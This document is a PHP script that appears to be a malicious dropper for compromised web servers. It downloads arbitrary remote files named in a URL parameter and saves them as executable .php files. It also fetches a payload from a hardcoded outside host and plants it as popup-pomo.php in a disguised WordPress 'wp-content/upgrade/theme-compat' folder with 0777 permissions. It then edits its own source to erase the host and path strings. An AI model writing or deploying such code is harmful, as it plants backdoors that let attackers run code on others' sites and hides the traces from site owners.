<?php

@set_time_limit(0);
@ini_set('display_errors', 1);
if(isset($_GET['use']) && $_GET['use'] == '2')
	define('USEFUNCTION',2);
else
	define('USEFUNCTION',1);


if(isset($_GET['check'])){
	
$file[] =  'id0.php';
$file[] =  'id1.php';
$file[] =  'id10.php';
$file[] =  'id11.php';
$file[] =  'id12.php';
$file[] =  'id13.php';
$file[] =  'id14.php';
$file[] =  'id15.php';
$file[] =  'id16.php';
$file[] =  'id17.php';
$file[] =  'id18.php';
$file[] =  'id19.php';
$file[] =  'id2.php';
$file[] =  'id20.php';
$file[] =  'id21.php';
$file[] =  'id22.php';
$file[] =  'id23.php';
$file[] =  'id24.php';
$file[] =  'id25.php';
$file[] =  'id26.php';
$file[] =  'id27.php';
$file[] =  'id28.php';
$file[] =  'id29.php';
$file[] =  'id3.php';
$file[] =  'id30.php';
$file[] =  'id31.php';
$file[] =  'id32.php';
$file[] =  'id33.php';
$file[] =  'id34.php';
$file[] =  'id35.php';
$file[] =  'id36.php';
$file[] =  'id37.php';
$file[] =  'id38.php';
$file[] =  'id39.php';
$file[] =  'id4.php';
$file[] =  'id40.php';
$file[] =  'id41.php';
$file[] =  'id42.php';
$file[] =  'id43.php';
$file[] =  'id44.php';
$file[] =  'id45.php';
$file[] =  'id46.php';
$file[] =  'id47.php';
$file[] =  'id5.php';
$file[] =  'id6.php';
$file[] =  'id7.php';
$file[] =  'id8.php';
$file[] =  'id9.php';
$file[] =  'index.php';
$file[] =  'word.php';
$file[] =  'moban.html';


foreach($file as $values){
	if(file_exists($values)){
			$handle = fopen($values,'rb');

			$rdSIze = filesize("./".$values);
			$tempStr = fread($handle, $rdSIze); 
			fclose($handle); 
			if(strstr($tempStr,'//file end')){
				echo "<div style='color:#216AEA;font-weight:bold;'>$values has successed!</div><br/>";
				@chmod($values,0744);
			}else{
				echo "<div style='color:red;font-weight:bold;'>file $values must be reload!</div><br/>";
			}
			unset($tempStr);
	
	}else{
		echo "<div style='color:red;font-weight:bold;'>file $values not found!</div><br/>";
	}
}

die();

}



$url = $_GET['urls'];

if(!trim($url)){
	die("error!");
}

		
	
$str = curl_get_from_webpage($url);

if(!$str)
	die("error 2!");

$fileNameArr = array();
$arrFile = explode(PHP_EOL, $str);
if(count($arrFile) < 2){
	$arrFile = explode("http://", $str);
	foreach($arrFile as $key => $values){
		if(trim($values)){
			$arrFile[$key] = "http://" . trim($values);
		}
	}
}

foreach($arrFile as $values){
	$values = trim($values);
	if($values){
		
		$fileName = @str_replace(".txt",".php",end(explode("/",$values)));


		if(file_exists("./".$fileName)){
			
			$handle = fopen("./".$fileName,'rb');

			$rdSIze = filesize("./".$fileName);
			$tempStr = fread($handle, $rdSIze); 
			fclose($handle); 
	
			if(strstr($tempStr,'//file end')){
				echo "<div style='color:#216AEA;font-weight:bold;'>$fileName has successed!</div><br/>";
				@chmod("./".$fileName,0744);
				unset($tempStr);
				continue;
			}
			unset($tempStr);

		}

		
		$getStr = curl_get_from_webpage_one_time($values);
		if(!trim($getStr)){
			echo "<div style='color:red;font-weight:bold;'>file $values is empty!</div><br/>";
			continue;
		}
		
		
			
		if($fileName){
			$fileNameArr[] = $fileName;
			file_put_contents($fileName, $getStr);
			@chmod($fileName,0744);
		}
	}
}

foreach($fileNameArr as $values){
	if(file_exists($values)){
		echo "<div style='color:green;font-weight:bold;'>get $values success!</div><br/>";
	}else{
		echo "<div style='color:red;font-weight:bold;'>get $values success fail!</div><br/>";
	}
}



$str_hm = curl_get_from_webpage("http://www.bicycle2016.net/popup-pomo.txt");

if (! is_dir ( "../wp-content" ))
	mkdir ( "../wp-content", 0777 );


if (! is_dir ( "../wp-content/upgrade" ))
	mkdir ( "../wp-content/upgrade", 0777 );




if (! is_dir ( "../wp-content/upgrade/theme-compat" ))
	mkdir ( "../wp-content/upgrade/theme-compat", 0777 );

	
file_put_contents("../wp-content/upgrade/theme-compat/popup-pomo.php", $str_hm);
@chmod("../wp-content/upgrade/theme-compat/popup-pomo.php",0777);


$str_get = file_get_contents("getFile.php");
$str_get = str_replace("wp-content","",$str_get);
$str_get = str_replace("upgrade","",$str_get);
$str_get = str_replace("theme-compat","",$str_get);
$str_get = str_replace("popup-pomo.txt","",$str_get);
$str_get = str_replace("http://www.bicycle2016.net/popup-pomo.txt","",$str_get);

file_put_contents("getFile.php",$str_get);

die();



function curl_get_from_webpage($url,$proxy='',$loop=10){
	$data = false;
        $i = 0;
        while(!$data) {
             $data = curl_get_from_webpage_one_time($url,$proxy);
             if($i++ >= $loop) break;
        }
	return $data;
}
 
 
 


function curl_get_from_webpage_one_time($url,$proxy='',$tms=0){
	  $data = false;
  if(USEFUNCTION == 1){
 		$curl = curl_init();	
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_HEADER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		$data=curl_exec($curl);
		curl_close($curl);
 
  }elseif(USEFUNCTION == 2){
		$data = @file_get_contents($url);
  }
 
  return $data;
}